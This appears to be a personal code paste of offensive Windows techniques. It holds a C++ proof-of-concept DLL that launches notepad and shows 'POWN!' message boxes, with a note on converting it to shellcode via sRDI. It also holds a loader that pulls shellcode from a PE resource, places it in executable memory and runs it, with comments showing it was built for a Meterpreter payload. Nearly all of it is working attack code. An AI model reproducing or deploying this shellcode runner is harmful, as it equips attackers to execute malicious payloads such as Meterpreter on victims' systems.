#DLL_TO_SHELLCODE
#https://github.com/monoxgas/sRDI
#C:\Users\Jupi\AppData\Local\Programs\Python\Python310\python.exe .\ConvertToShellcode.py .\MessageBox_DLL.dll
 
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "windows.h"


void pown() {

    MessageBox(0, TEXT("ENTRY POINT!"), TEXT("POWN!"), MB_OK);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )


{
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, TRUE, 0, NULL, NULL, si, pi);

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        MessageBox(0, TEXT("POWN!"), TEXT("POWN!"), MB_OK);
        pown();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


-------------------------------------------------------------------

Loading and Executing Shellcode From PE Resources

#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
	// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
	// METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_TEST1), L"TEST");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

	return  0;
}
